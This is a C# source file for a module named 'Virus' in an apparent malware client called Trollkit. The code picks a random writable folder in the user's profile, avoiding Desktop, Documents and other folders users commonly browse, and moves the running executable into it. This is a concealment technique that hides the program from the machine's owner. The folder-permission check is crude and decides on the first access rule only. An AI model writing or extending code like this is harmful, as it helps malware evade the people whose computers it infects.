using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Trollkit_Library;

namespace Trollkit_Client.Modules
{
	public class Virus
	{

		public Virus()
		{

		}

		public string FindRandomFileLocation()
		{
			string filename = Process.GetCurrentProcess().MainModule.FileName;
			BConsole.WriteLine(filename);
			string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			string[] dir = Directory.GetFileSystemEntries(path);

			string[] ex_filter = new string[] { "Desktop", "Documents", "Downloads", "Pictures", "Videos", "Music" };

			List<string> files = dir.Where(n => !ex_filter.Contains(n.Split('\\').Last())).ToList();

			string fndPath = files[new Random().Next(0, files.Count)];
			bool canWrite = HasFolderWritePermission(fndPath);
			while (!canWrite)
			{			
				fndPath = files[new Random().Next(0, files.Count)];
				canWrite = HasFolderWritePermission(fndPath);
			}

			return fndPath;
		}

		public string MoveFileToLocation(string destinationPath)
		{
			try {
				File.Move(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName);
			}
			catch (IOException iox)
			{
				BConsole.WriteLine(iox.Message);
			}

			return destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName;
		}

		public bool HasFolderWritePermission(string destDir)
		{
			if (string.IsNullOrEmpty(destDir) || !Directory.Exists(destDir)) return false;
			try
			{
				DirectorySecurity security = Directory.GetAccessControl(destDir);
				SecurityIdentifier users = new SecurityIdentifier(WellKnownSidType.SelfSid, null);

				WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
				WindowsPrincipal principal = new WindowsPrincipal(currentUser);

				foreach (AuthorizationRule rule in security.GetAccessRules(true, true, typeof(NTAccount)))
				{


					FileSystemAccessRule fsAccessRule = rule as FileSystemAccessRule;
					if (fsAccessRule == null)
						return false;

					if(fsAccessRule.AccessControlType == AccessControlType.Deny && fsAccessRule.IdentityReference.Value == "Everyone")
					{
						return false;
					}
					else
					{
						return true;
					}					
				}


				return false;
			}
			catch
			{
				return false;
			}
		}
	}
}
